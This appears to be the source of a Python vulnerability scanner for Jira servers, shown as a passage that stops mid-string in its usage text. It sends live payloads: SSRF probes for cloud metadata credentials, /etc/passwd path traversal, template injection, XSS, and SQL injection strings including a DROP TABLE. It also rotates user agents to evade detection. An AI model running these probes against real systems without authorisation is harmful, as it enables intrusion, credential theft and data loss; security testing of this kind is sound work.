#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Jira Security Assessment Tool
Author: sevbandonmez
Version: 1.0
"""

import sys
import json
import requests
import socket
import threading
import os
import time
import hashlib
import base64
import urllib3
from urllib.parse import urlparse, urljoin
import argparse
from concurrent.futures import ThreadPoolExecutor
import xml.etree.ElementTree as ET
from datetime import datetime
import re
import random
import string

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

class JiraSecurityScanner:
    def __init__(self, verify_ssl=True, timeout=15, retries=3, callback_url=None):
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.retries = retries
        self.callback_url = callback_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self._generate_random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.vulnerabilities = []
        self.info_disclosures = []
        self.target_info = {}
        
    def _generate_random_ua(self):
        """Generate random user agent to avoid detection"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        return random.choice(user_agents)
    
    def _make_request(self, method, url, **kwargs):
        """Make HTTP request with retry logic"""
        kwargs.setdefault('verify', self.verify_ssl)
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('allow_redirects', False)
        
        for attempt in range(self.retries):
            try:
                response = self.session.request(method, url, **kwargs)
                return response
            except requests.exceptions.RequestException as e:
                if attempt == self.retries - 1:
                    self._log_error(f"Request failed after {self.retries} attempts: {e}")
                    return None
                time.sleep(random.uniform(1, 3))
        return None
    
    def _clean_url(self, url):
        """Clean and normalize URL"""
        while url.endswith("/"):
            url = url[:-1]
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url
    
    def _log_info(self, message):
        """Log informational message"""
        print(f"{Colors.CYAN}[INFO]{Colors.RESET} {message}")
    
    def _log_success(self, message):
        """Log success message"""
        print(f"{Colors.GREEN}[+]{Colors.RESET} {message}")
    
    def _log_warning(self, message):
        """Log warning message"""
        print(f"{Colors.YELLOW}[!]{Colors.RESET} {message}")
    
    def _log_error(self, message):
        """Log error message"""
        print(f"{Colors.RED}[-]{Colors.RESET} {message}")
    
    def _log_critical(self, message):
        """Log critical vulnerability"""
        print(f"{Colors.RED}[CRITICAL]{Colors.RESET} {message}")
    
    def _log_high(self, message):
        """Log high severity vulnerability"""
        print(f"{Colors.MAGENTA}[HIGH]{Colors.RESET} {message}")
    
    def _log_medium(self, message):
        """Log medium severity vulnerability"""
        print(f"{Colors.YELLOW}[MEDIUM]{Colors.RESET} {message}")
    
    def _log_low(self, message):
        """Log low severity vulnerability"""
        print(f"{Colors.BLUE}[LOW]{Colors.RESET} {message}")
    
    def _add_vulnerability(self, vuln_type, severity, description, url, evidence=None):
        """Add vulnerability to results"""
        vuln = {
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'url': url,
            'evidence': evidence,
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
    
    def detect_jira_version(self, base_url):
        """Enhanced Jira version detection with multiple methods"""
        self._log_info("Detecting Jira version and gathering server information...")
        
        # Method 1: Standard API endpoint
        endpoints = [
            '/rest/api/latest/serverInfo',
            '/rest/api/2/serverInfo',
            '/rest/api/1.0/serverInfo'
        ]
        
        for endpoint in endpoints:
            response = self._make_request('GET', base_url + endpoint)
            if response and response.status_code == 200:
                try:
                    server_data = response.json()
                    self.target_info = server_data
                    self._display_server_info(server_data, base_url)
                    return server_data
                except json.JSONDecodeError:
                    continue
        
        # Method 2: Check HTML meta tags
        response = self._make_request('GET', base_url + '/')
        if response and response.status_code == 200:
            content = response.text
            version_patterns = [
                r'data-version="([^"]+)"',
                r'ajs-version-number["\s]*[:\s]*["\']\s*([^"\']+)',
                r'JIRA\s+([0-9]+\.[0-9]+\.[0-9]+)',
            ]
            
            for pattern in version_patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    self._log_success(f"Version detected from HTML: {version}")
                    self.target_info['version'] = version
                    break
        
        # Method 3: Check common static files
        version_files = [
            '/s/en_GB/7901/81/1.4.25/_/download/batch/com.atlassian.jira.collector.plugin.jira-issue-collector-plugin:issuecollector/com.atlassian.jira.collector.plugin.jira-issue-collector-plugin:issuecollector.js',
            '/s/_/download/batch/com.atlassian.plugins.jquery:jquery/com.atlassian.plugins.jquery:jquery.js',
        ]
        
        for file_path in version_files:
            response = self._make_request('GET', base_url + file_path)
            if response and response.status_code == 200:
                version_match = re.search(r'version["\s]*[:\s]*["\']\s*([0-9]+\.[0-9]+\.[0-9]+)', response.text)
                if version_match:
                    version = version_match.group(1)
                    self._log_success(f"Version detected from static file: {version}")
                    self.target_info['version'] = version
                    break
    
    def _display_server_info(self, server_data, base_url):
        """Display server information"""
        print(f"\n{Colors.GREEN}========== Server Information =========={Colors.RESET}")
        print(f"{Colors.MAGENTA}URL:{Colors.RESET} {server_data.get('baseUrl', base_url)}")
        print(f"{Colors.MAGENTA}Title:{Colors.RESET} {server_data.get('serverTitle', 'Unknown')}")
        print(f"{Colors.MAGENTA}Version:{Colors.RESET} {server_data.get('version', 'Unknown')}")
        print(f"{Colors.MAGENTA}Build:{Colors.RESET} {server_data.get('buildNumber', 'Unknown')}")
        print(f"{Colors.MAGENTA}Deployment:{Colors.RESET} {server_data.get('deploymentType', 'Unknown')}")
        
        # Resolve host information
        try:
            parsed = urlparse(base_url)
            host_info = socket.gethostbyname_ex(parsed.netloc)
            print(f"{Colors.MAGENTA}Host:{Colors.RESET} {host_info[0]}")
            print(f"{Colors.MAGENTA}IP:{Colors.RESET} {host_info[2][0] if host_info[2] else 'Unknown'}")
        except:
            print(f"{Colors.MAGENTA}Host:{Colors.RESET} Unable to resolve")
        
        print("=" * 42 + "\n")
    
    def check_aws_environment(self, base_url):
        """Check if target is running on AWS"""
        try:
            parsed = urlparse(base_url)
            host_info = socket.gethostbyname_ex(parsed.netloc)
            return 'amazonaws' in host_info[0].lower() if host_info[0] else False
        except:
            return False
    
    # CVE Checks
    def check_cve_2017_9506(self, base_url):
        """CVE-2017-9506: SSRF via OAuth user authorization"""
        self._log_info("Checking CVE-2017-9506 (SSRF)...")
        
        # Test external domain
        test_url = "https://httpbin.org/get"
        endpoint = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={test_url}"
        
        response = self._make_request('GET', endpoint)
        if response and response.status_code == 200:
            if "httpbin" in response.text.lower() or "origin" in response.text.lower():
                self._log_critical(f"CVE-2017-9506 SSRF vulnerability confirmed!")
                self._add_vulnerability('CVE-2017-9506', 'CRITICAL', 'SSRF vulnerability', endpoint)
                
                # Test for cloud metadata access
                self._test_metadata_access(base_url, endpoint_template="/plugins/servlet/oauth/users/icon-uri?consumerUri={}")
                return True
        
        self._log_info("Not vulnerable to CVE-2017-9506")
        return False
    
    def check_cve_2019_8451(self, base_url):
        """CVE-2019-8451: SSRF via gadget rendering"""
        self._log_info("Checking CVE-2019-8451 (SSRF)...")
        
        test_url = "https://httpbin.org/get"
        endpoint = f"{base_url}/plugins/servlet/gadgets/makeRequest?url={test_url}"
        
        response = self._make_request('GET', endpoint)
        if response and response.status_code == 200:
            if "httpbin" in response.text.lower() or "origin" in response.text.lower():
                self._log_critical(f"CVE-2019-8451 SSRF vulnerability confirmed!")
                self._add_vulnerability('CVE-2019-8451', 'CRITICAL', 'SSRF via gadget makeRequest', endpoint)
                
                # Test for cloud metadata access
                self._test_metadata_access(base_url, endpoint_template="/plugins/servlet/gadgets/makeRequest?url={}")
                return True
        
        self._log_info("Not vulnerable to CVE-2019-8451")
        return False
    
    def _test_metadata_access(self, base_url, endpoint_template):
        """Test for cloud metadata access via SSRF"""
        metadata_endpoints = {
            'AWS': 'http://169.254.169.254/latest/meta-data/',
            'GCP': 'http://metadata.google.internal/computeMetadata/v1/',
            'Azure': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'Alibaba': 'http://100.100.100.200/latest/meta-data/',
            'Docker': 'http://127.0.0.1:2375/version',
            'Kubernetes': 'http://127.0.0.1:10250/pods'
        }
        
        for cloud_provider, metadata_url in metadata_endpoints.items():
            test_endpoint = base_url + endpoint_template.format(metadata_url)
            response = self._make_request('GET', test_endpoint)
            
            if response and response.status_code == 200:
                content = response.text.lower()
                
                # Check for cloud provider specific indicators
                indicators = {
                    'AWS': ['ami-', 'instance-id', 'security-credentials'],
                    'GCP': ['project-id', 'service-accounts'],
                    'Azure': ['compute', 'network'],
                    'Alibaba': ['instance-id', 'zone-id'],
                    'Docker': ['apiversion', 'version'],
                    'Kubernetes': ['pod', 'namespace']
                }
                
                if any(indicator in content for indicator in indicators.get(cloud_provider, [])):
                    self._log_critical(f"{cloud_provider} metadata accessible!")
                    self._add_vulnerability(
                        f'Metadata-{cloud_provider}', 
                        'CRITICAL', 
                        f'{cloud_provider} metadata exposure via SSRF', 
                        test_endpoint,
                        evidence=response.text[:500]
                    )
    
    def check_cve_2019_3396(self, base_url):
        """CVE-2019-3396: Path traversal and RCE"""
        self._log_info("Checking CVE-2019-3396 (Path Traversal/RCE)...")
        
        endpoint = f"{base_url}/rest/tinymce/1/macro/preview"
        
        # Test if endpoint is accessible
        response = self._make_request('GET', endpoint)
        if not response or response.status_code != 200:
            self._log_info("Not vulnerable to CVE-2019-3396 (endpoint not accessible)")
            return False
        
        # Craft payload for path traversal
        payloads = [
            {
                "contentId": "1",
                "macro": {
                    "name": "widget",
                    "params": {
                        "url": "https://www.atlassian.com",
                        "width": "1000",
                        "height": "1000",
                        "_template": "file:///etc/passwd"
                    },
                    "body": ""
                }
            },
            {
                "contentId": "1",
                "macro": {
                    "name": "widget",
                    "params": {
                        "url": "https://www.atlassian.com",
                        "_template": "file:///windows/system32/drivers/etc/hosts"
                    },
                    "body": ""
                }
            }
        ]
        
        for payload in payloads:
            response = self._make_request('POST', endpoint, json=payload)
            if response and response.status_code == 200:
                content = response.text.lower()
                
                # Check for file contents
                if any(indicator in content for indicator in ['root:', 'daemon:', 'localhost', '127.0.0.1']):
                    self._log_critical("CVE-2019-3396 Path Traversal vulnerability confirmed!")
                    self._add_vulnerability('CVE-2019-3396', 'CRITICAL', 'Path Traversal/RCE', endpoint, evidence=content[:200])
                    return True
        
        self._log_info("Not vulnerable to CVE-2019-3396")
        return False
    
    def check_cve_2019_11581(self, base_url):
        """CVE-2019-11581: Server Side Template Injection"""
        self._log_info("Checking CVE-2019-11581 (SSTI)...")
        
        endpoint = f"{base_url}/secure/ContactAdministrators!default.jspa"
        response = self._make_request('GET', endpoint)
        
        if response and response.status_code == 200:
            # Look for template injection indicators
            payloads = [
                "?subject=${{7*7}}&body=test",
                "?subject=${7*7}&body=test",
                "?subject={{7*7}}&body=test"
            ]
            
            for payload in payloads:
                test_url = endpoint + payload
                test_response = self._make_request('GET', test_url)
                
                if test_response and test_response.status_code == 200:
                    if "49" in test_response.text or "template" in test_response.text.lower():
                        self._log_critical("CVE-2019-11581 SSTI vulnerability detected!")
                        self._add_vulnerability('CVE-2019-11581', 'CRITICAL', 'Server Side Template Injection', test_url)
                        return True
        
        self._log_info("Not vulnerable to CVE-2019-11581")
        return False
    
    def check_cve_2019_8449(self, base_url):
        """CVE-2019-8449: User information disclosure"""
        self._log_info("Checking CVE-2019-8449 (User enumeration)...")
        
        endpoint = f"{base_url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
        response = self._make_request('GET', endpoint)
        
        if response and response.status_code == 200:
            try:
                data = response.json()
                if 'users' in data and data['users']:
                    user_count = len(data['users'])
                    self._log_medium(f"CVE-2019-8449: {user_count} users disclosed")
                    self._add_vulnerability('CVE-2019-8449', 'MEDIUM', f'User information disclosure ({user_count} users)', endpoint)
                    return True
            except json.JSONDecodeError:
                pass
        
        self._log_info("Not vulnerable to CVE-2019-8449")
        return False
    
    def check_cve_2018_20824(self, base_url):
        """CVE-2018-20824: XSS in Wallboard"""
        self._log_info("Checking CVE-2018-20824 (XSS)...")
        
        xss_payload = 'alert("XSS_TEST_' + ''.join(random.choices(string.ascii_uppercase, k=6)) + '")'
        endpoint = f"{base_url}/plugins/servlet/Wallboard/?dashboardId=10000&cyclePeriod={xss_payload}"
        
        response = self._make_request('GET', endpoint)
        if response and response.status_code == 200:
            if "XSS_TEST_" in response.text and "alert(" in response.text:
                self._log_high("CVE-2018-20824 XSS vulnerability confirmed!")
                self._add_vulnerability('CVE-2018-20824', 'HIGH', 'Cross-Site Scripting in Wallboard', endpoint)
                return True
        
        self._log_info("Not vulnerable to CVE-2018-20824")
        return False
    
    def check_cve_2020_14179(self, base_url):
        """CVE-2020-14179: Information disclosure"""
        self._log_info("Checking CVE-2020-14179 (Information disclosure)...")
        
        endpoint = f"{base_url}/secure/QueryComponent!Default.jspa"
        response = self._make_request('GET', endpoint)
        
        if response and response.status_code == 200:
            # Look for sensitive information in response
            sensitive_patterns = [
                r'class="field-group"',
                r'searchers',
                r'navigator-columns',
                r'issue-table'
            ]
            
            content = response.text
            matches = sum(1 for pattern in sensitive_patterns if re.search(pattern, content))
            
            if matches >= 2:
                self._log_low("CVE-2020-14179 Information disclosure detected")
                self._add_vulnerability('CVE-2020-14179', 'LOW', 'Information disclosure via QueryComponent', endpoint)
                return True
        
        self._log_info("Not vulnerable to CVE-2020-14179")
        return False
    
    def check_cve_2020_14181(self, base_url):
        """CVE-2020-14181: User enumeration"""
        self._log_info("Checking CVE-2020-14181 (User enumeration)...")
        
        test_users = ['admin', 'administrator', 'user', 'test', 'guest', 'jira-admin']
        
        for username in test_users:
            endpoint = f"{base_url}/secure/ViewUserHover.jspa?username={username}"
            response = self._make_request('GET', endpoint)
            
            if response and response.status_code == 200:
                if "user-hover" in response.text.lower() or "display-name" in response.text.lower():
                    self._log_medium(f"CVE-2020-14181: User '{username}' enumeration possible")
                    self._add_vulnerability('CVE-2020-14181', 'MEDIUM', f'User enumeration for {username}', endpoint)
                    return True
        
        self._log_info("Not vulnerable to CVE-2020-14181")
        return False
    
    # Advanced Detection Methods
    def check_blind_ssrf(self, base_url):
        """Advanced blind SSRF testing"""
        self._log_info("Checking for blind SSRF vulnerabilities...")
        
        if not self.callback_url:
            self._log_warning("No callback URL provided. Skipping blind SSRF tests.")
            self._log_info("Use --callback-url parameter to enable blind SSRF testing.")
            return
        
        # Generate unique callback ID
        callback_id = hashlib.md5(f"{base_url}{datetime.now()}".encode()).hexdigest()[:10]
        
        # Use user-provided callback URL with unique ID
        if self.callback_url.endswith('/'):
            test_callback_url = f"{self.callback_url}{callback_id}"
        else:
            test_callback_url = f"{self.callback_url}/{callback_id}"
        
        ssrf_endpoints = [
            f"/plugins/servlet/oauth/users/icon-uri?consumerUri={test_callback_url}",
            f"/plugins/servlet/gadgets/makeRequest?url={test_callback_url}",
            f"/rest/api/2/user/avatar?url={test_callback_url}",
            f"/secure/attachment/{callback_id}/callback.txt"
        ]
        
        for endpoint in ssrf_endpoints:
            response = self._make_request('GET', base_url + endpoint)
            if response:
                self._log_info(f"Blind SSRF test sent to: {test_callback_url}")
                self._log_info(f"Check your callback server for requests from: {base_url}")
                self._log_info(f"Potential SSRF endpoint tested: {endpoint}")
    
    def check_information_disclosure(self, base_url):
        """Comprehensive information disclosure testing"""
        self._log_info("Checking for information disclosure vulnerabilities...")
        
        disclosure_endpoints = [
            '/rest/api/2/serverInfo',
            '/rest/api/2/configuration',
            '/rest/api/2/settings',
            '/rest/api/2/user?maxResults=1000',
            '/rest/api/2/project?expand=permissions',
            '/rest/api/2/dashboard?maxResults=1000',
            '/secure/Dashboard.jspa',
            '/secure/admin/ViewApplicationProperties.jspa',
            '/plugins/servlet/project-config/{}/permissions',
            '/rest/api/2/issue/createmeta',
            '/rest/dev-status/1.0/issue/detail',
            '/rest/greenhopper/1.0/rapidview',
            '/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml',
            '/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml'
        ]
        
        for endpoint in disclosure_endpoints:
            response = self._make_request('GET', base_url + endpoint)
            if response and response.status_code == 200:
                content_type = response.headers.get('content-type', '').lower()
                
                # Check for sensitive information
                sensitive_keywords = [
                    'password', 'secret', 'token', 'key', 'credential',
                    'database', 'connection', 'config', 'admin',
                    'version', 'build', 'debug', 'error'
                ]
                
                content = response.text.lower()
                found_keywords = [kw for kw in sensitive_keywords if kw in content]
                
                if found_keywords:
                    severity = 'MEDIUM' if 'password' in found_keywords or 'secret' in found_keywords else 'LOW'
                    self._log_low(f"Information disclosure at {endpoint}")
                    self._add_vulnerability(
                        'INFO_DISCLOSURE', 
                        severity, 
                        f'Information disclosure: {", ".join(found_keywords)}', 
                        base_url + endpoint
                    )
    
    def check_authentication_bypass(self, base_url):
        """Test for authentication bypass vulnerabilities"""
        self._log_info("Checking for authentication bypass vulnerabilities...")
        
        admin_endpoints = [
            '/secure/admin/',
            '/secure/admin/ViewApplicationProperties.jspa',
            '/secure/admin/user/UserBrowser.jspa',
            '/secure/project/AddProject!default.jspa',
            '/secure/admin/IndexAdmin.jspa',
            '/rest/api/2/permissions',
            '/rest/api/2/user/assignable/multiProjectSearch',
            '/rest/api/2/groups/picker'
        ]
        
        for endpoint in admin_endpoints:
            response = self._make_request('GET', base_url + endpoint)
            if response and response.status_code == 200:
                # Check if admin functionality is accessible without authentication
                admin_indicators = [
                    'administration', 'admin panel', 'user browser',
                    'system information', 'application properties',
                    'add project', 'index admin'
                ]
                
                content = response.text.lower()
                if any(indicator in content for indicator in admin_indicators):
                    self._log_high(f"Potential authentication bypass at {endpoint}")
                    self._add_vulnerability(
                        'AUTH_BYPASS', 
                        'HIGH', 
                        'Authentication bypass - admin functionality accessible', 
                        base_url + endpoint
                    )
    
    def check_sql_injection(self, base_url):
        """Basic SQL injection testing"""
        self._log_info("Checking for SQL injection vulnerabilities...")
        
        sql_payloads = [
            "'",
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
        
        injection_endpoints = [
            '/rest/api/2/user/picker?query={}',
            '/rest/api/2/search?jql={}',
            '/secure/QuickSearch.jspa?searchString={}',
            '/rest/api/2/project/{}/permissions'
        ]
        
        for endpoint_template in injection_endpoints:
            for payload in sql_payloads:
                endpoint = base_url + endpoint_template.format(payload)
                response = self._make_request('GET', endpoint)
                
                if response:
                    # Look for SQL error indicators
                    sql_errors = [
                        'sql', 'mysql', 'postgresql', 'oracle', 'sqlite',
                        'syntax error', 'database error', 'jdbc',
                        'ORA-', 'ERROR 1064', 'PSQLException'
                    ]
                    
                    content = response.text.lower()
                    if any(error in content for error in sql_errors):
                        self._log_high(f"Potential SQL injection at {endpoint}")
                        self._add_vulnerability(
                            'SQL_INJECTION', 
                            'HIGH', 
                            'Potential SQL injection vulnerability', 
                            endpoint
                        )
    
    def check_file_upload_vulnerabilities(self, base_url):
        """Test for file upload vulnerabilities"""
        self._log_info("Checking for file upload vulnerabilities...")
        
        upload_endpoints = [
            '/secure/attachment/AttachFile.jspa',
            '/rest/api/2/attachment',
            '/secure/admin/ViewApplicationProperties!upload.jspa',
            '/plugins/servlet/attachments/upload'
        ]
        
        for endpoint in upload_endpoints:
            response = self._make_request('GET', base_url + endpoint)
            if response and response.status_code == 200:
                if 'multipart' in response.text.lower() or 'upload' in response.text.lower():
                    self._log_medium(f"File upload endpoint accessible: {endpoint}")
                    self._add_vulnerability(
                        'FILE_UPLOAD', 
                        'MEDIUM', 
                        'File upload endpoint accessible without authentication', 
                        base_url + endpoint
                    )
    
    def scan_target(self, url):
        """Main scanning function"""
        base_url = self._clean_url(url)
        
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}Starting security scan for: {base_url}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        # Version detection
        self.detect_jira_version(base_url)
        
        # AWS environment check
        is_aws = self.check_aws_environment(base_url)
        
        # CVE Checks
        vulnerabilities_found = []
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_check = {
                executor.submit(self.check_cve_2017_9506, base_url): 'CVE-2017-9506',
                executor.submit(self.check_cve_2019_8451, base_url): 'CVE-2019-8451',
                executor.submit(self.check_cve_2019_3396, base_url): 'CVE-2019-3396',
                executor.submit(self.check_cve_2019_11581, base_url): 'CVE-2019-11581',
                executor.submit(self.check_cve_2019_8449, base_url): 'CVE-2019-8449',
                executor.submit(self.check_cve_2018_20824, base_url): 'CVE-2018-20824',
                executor.submit(self.check_cve_2020_14179, base_url): 'CVE-2020-14179',
                executor.submit(self.check_cve_2020_14181, base_url): 'CVE-2020-14181',
            }
            
            for future in future_to_check:
                try:
                    result = future.result(timeout=30)
                    if result:
                        vulnerabilities_found.append(future_to_check[future])
                except Exception as e:
                    self._log_error(f"Error checking {future_to_check[future]}: {e}")
        
        # Advanced security checks
        self.check_information_disclosure(base_url)
        self.check_authentication_bypass(base_url)
        self.check_sql_injection(base_url)
        self.check_file_upload_vulnerabilities(base_url)
        self.check_blind_ssrf(base_url)
        
        # Additional custom checks
        self.check_user_registration(base_url)
        self.check_dev_mode(base_url)
        self.check_debug_endpoints(base_url)
        self.check_backup_files(base_url)
        self.check_api_endpoints(base_url)
        
        return len(self.vulnerabilities) > 0
    
    def check_user_registration(self, base_url):
        """Check if user registration is enabled"""
        self._log_info("Checking user registration status...")
        
        endpoint = f"{base_url}/secure/Signup!default.jspa"
        response = self._make_request('GET', endpoint)
        
        if response and response.status_code == 200:
            if "sign up" in response.text.lower() and "private" not in response.text.lower():
                self._log_medium("User registration is enabled")
                self._add_vulnerability('USER_REGISTRATION', 'MEDIUM', 'Public user registration enabled', endpoint)
            else:
                self._log_info("User registration is disabled")
    
    def check_dev_mode(self, base_url):
        """Check if development mode is enabled"""
        self._log_info("Checking development mode status...")
        
        response = self._make_request('GET', base_url + '/')
        if response and response.status_code == 200:
            if 'ajs-dev-mode' in response.text and 'content="true"' in response.text:
                self._log_medium("Development mode is enabled")
                self._add_vulnerability('DEV_MODE', 'MEDIUM', 'Development mode enabled', base_url)
            else:
                self._log_info("Development mode is disabled")
    
    def check_debug_endpoints(self, base_url):
        """Check for accessible debug endpoints"""
        self._log_info("Checking debug endpoints...")
        
        debug_endpoints = [
            '/debug',
            '/debug/profiling',
            '/secure/admin/jira/IndexProgress.jspa',
            '/rest/api/2/myself/properties',
            '/rest/gadget/1.0/currentUser',
            '/rest/auth/1/session',
            '/status',
            '/health',
            '/actuator/health',
            '/management/health'
        ]
        
        for endpoint in debug_endpoints:
            response = self._make_request('GET', base_url + endpoint)
            if response and response.status_code == 200:
                content = response.text.lower()
                if any(keyword in content for keyword in ['debug', 'status', 'health', 'session', 'profiling']):
                    self._log_low(f"Debug endpoint accessible: {endpoint}")
                    self._add_vulnerability('DEBUG_ENDPOINT', 'LOW', f'Debug endpoint accessible: {endpoint}', base_url + endpoint)
    
    def check_backup_files(self, base_url):
        """Check for accessible backup files"""
        self._log_info("Checking for backup files...")
        
        backup_files = [
            '/backup.zip',
            '/backup.tar.gz',
            '/backup.sql',
            '/database.sql',
            '/dump.sql',
            '/jira-backup.zip',
            '/atlassian-backup.tar.gz',
            '/export.xml',
            '/database_backup.sql',
            '/.git/config',
            '/.env',
            '/config.properties',
            '/application.properties'
        ]
        
        for backup_file in backup_files:
            response = self._make_request('GET', base_url + backup_file)
            if response and response.status_code == 200:
                file_size = len(response.content)
                if file_size > 100:  # Avoid false positives from error pages
                    self._log_high(f"Backup file accessible: {backup_file} ({file_size} bytes)")
                    self._add_vulnerability('BACKUP_FILE', 'HIGH', f'Backup file accessible: {backup_file}', base_url + backup_file)
    
    def check_api_endpoints(self, base_url):
        """Comprehensive API endpoint testing"""
        self._log_info("Checking API endpoints...")
        
        api_endpoints = [
            ('/rest/api/2/user/search?username=admin', 'User search'),
            ('/rest/api/2/project/search', 'Project search'),
            ('/rest/api/2/issue/picker', 'Issue picker'),
            ('/rest/api/2/resolution', 'Resolutions'),
            ('/rest/api/2/priority', 'Priorities'),
            ('/rest/api/2/issuetype', 'Issue types'),
            ('/rest/api/2/status', 'Statuses'),
            ('/rest/api/2/field', 'Fields'),
            ('/rest/api/2/screens', 'Screens'),
            ('/rest/api/2/workflow', 'Workflows'),
            ('/rest/api/2/workflowscheme', 'Workflow schemes'),
            ('/rest/api/2/configuration', 'Configuration'),
            ('/rest/api/2/settings', 'Settings'),
            ('/rest/api/2/universal_avatar/type/project/system', 'System avatars'),
            ('/rest/api/2/dashboard?maxResults=100', 'Dashboards'),
            ('/rest/api/2/filter?maxResults=100', 'Filters'),
            ('/rest/api/2/groupuserpicker', 'Group user picker'),
            ('/rest/api/2/groups/picker', 'Groups picker'),
            ('/rest/api/2/mypermissions', 'User permissions'),
            ('/rest/api/2/myself', 'Current user info')
        ]
        
        for endpoint, description in api_endpoints:
            response = self._make_request('GET', base_url + endpoint)
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if data and not isinstance(data, dict) or (isinstance(data, dict) and data):
                        severity = 'MEDIUM' if 'user' in endpoint.lower() or 'permission' in endpoint.lower() else 'LOW'
                        self._log_low(f"{description} API accessible: {endpoint}")
                        self._add_vulnerability('API_EXPOSURE', severity, f'{description} API accessible without authentication', base_url + endpoint)
                except json.JSONDecodeError:
                    # Still might be sensitive if it returns data
                    if len(response.text) > 100:
                        self._log_low(f"{description} endpoint accessible: {endpoint}")
                        self._add_vulnerability('API_EXPOSURE', 'LOW', f'{description} endpoint accessible', base_url + endpoint)
    
    def generate_report(self, output_folder='output/'):
        """Generate comprehensive security report"""
        if not os.path.exists(output_folder):
            os.makedirs(output_folder)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = os.path.join(output_folder, f'jira_security_report_{timestamp}.json')
        
        report = {
            'scan_info': {
                'timestamp': datetime.now().isoformat(),
                'target_info': self.target_info,
                'total_vulnerabilities': len(self.vulnerabilities)
            },
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'LOW'])
            }
        }
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Generate text report
        text_report_file = os.path.join(output_folder, f'jira_security_report_{timestamp}.txt')
        with open(text_report_file, 'w', encoding='utf-8') as f:
            f.write(f"JIRA Security Assessment Report\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*50}\n\n")
            
            if self.target_info:
                f.write("Target Information:\n")
                for key, value in self.target_info.items():
                    f.write(f"  {key}: {value}\n")
                f.write("\n")
            
            f.write(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n")
            f.write(f"  Critical: {report['summary']['critical']}\n")
            f.write(f"  High: {report['summary']['high']}\n")
            f.write(f"  Medium: {report['summary']['medium']}\n")
            f.write(f"  Low: {report['summary']['low']}\n\n")
            
            for vuln in self.vulnerabilities:
                f.write(f"[{vuln['severity']}] {vuln['type']}\n")
                f.write(f"Description: {vuln['description']}\n")
                f.write(f"URL: {vuln['url']}\n")
                if vuln.get('evidence'):
                    f.write(f"Evidence: {vuln['evidence'][:200]}...\n")
                f.write(f"Timestamp: {vuln['timestamp']}\n")
                f.write("-" * 40 + "\n")
        
        self._log_success(f"Reports generated: {report_file} and {text_report_file}")
        return report_file, text_report_file


def print_usage():
    """Print usage information"""
    usage = f"""
{Colors.CYAN}Advanced Jira Security Assessment Tool{Colors.RESET}
Author: sevbandonmez
Version: 1.0

{Colors.YELLOW}Usage:{Colors.RESET}
  python3 jira_scanner.py -u <target_url> [options]
  python3 jira_scanner.py -f <url_file> [options]

{Colors.YELLOW}Options:{Colors.RESET}
  -u, --url           Target URL
  -f, --file          File containing list of URLs
  -c, --cookie        Authentication cookie
  -o, --output        Output directory (default: output/)
  -i, --insecure      Disable SSL verification
  -t, --timeout       Request timeout in seconds (default: 15)
  -r, --retries       Number of retries (default: 3)
  --callback-url      Callback URL for blind SSRF testing
  -h, --help          Show this help message

{Colors.YELLOW}Examples:{Colors.RESET}
  python3 jira_scanner.py -u https://jira.example.com
  python3 jira_scanner.py -f urls.txt -o reports/ -i
  python3 jira_scanner.py -u https://jira.example.com -c "JSESSIONID=ABC123"
